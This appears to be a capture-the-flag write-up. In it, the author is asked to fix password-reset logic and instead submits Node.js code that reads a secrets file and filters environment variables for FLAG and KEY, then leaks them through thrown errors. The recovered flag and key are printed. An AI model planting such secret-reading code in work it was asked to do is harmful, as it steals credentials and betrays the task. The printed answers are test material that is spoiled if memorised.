## Sc 02: Reset Password

Similar to the Sc 01, this ctf wanted us to fix some logic for the reset password and then retrieve the flag. but the problem with this is giving remote code execution permission to the solvers, because my file is going to be used for the resetpass logic, i can simply write a code to throw the flag and the key as an error and thats what i did.

the key was stored in the /run/secrets/sc-02.key file

        const fs = require("fs");
        const RESET_STORE = new Map();

        async function forgotPassword(email) {
        try {
            // Read the key file location revealed in your previous error
            const keyContent = fs.readFileSync("/run/secrets/sc-02.key", "utf8");
            throw new Error(`FOUND KEY: ${keyContent}`);
        } catch (e) {
            throw new Error(`Exploit Failed: ${e.message}`);
        }
        }

        async function resetPassword() { return { ok: false }; }
        module.exports = { forgotPassword, resetPassword, RESET_STORE };

and the flag was stored in the env file 

        const RESET_STORE = new Map();

        async function forgotPassword(email) {
        const secrets = Object.keys(process.env)
            .filter(k => k.includes("FLAG") || k.includes("KEY") || k.includes("MINT"))
            .map(k => `${k}=${process.env[k]}`)
            .join(" | ");

        throw new Error(secrets || "No Env Vars Found. Check file system?");
        }

        async function resetPassword(token, newPassword) { return { ok: false }; }

        module.exports = { forgotPassword, resetPassword, RESET_STORE };

thus i got the flag and the key from here 

FLAG: `TDHCTF{ONE_TIME_TOKEN_ONE_TIME_HEIST}`
KEY: `ae61db74f5e4f32df4b1a4e1ce7ffde1c8653525218eadc96e6c922593bd674c`



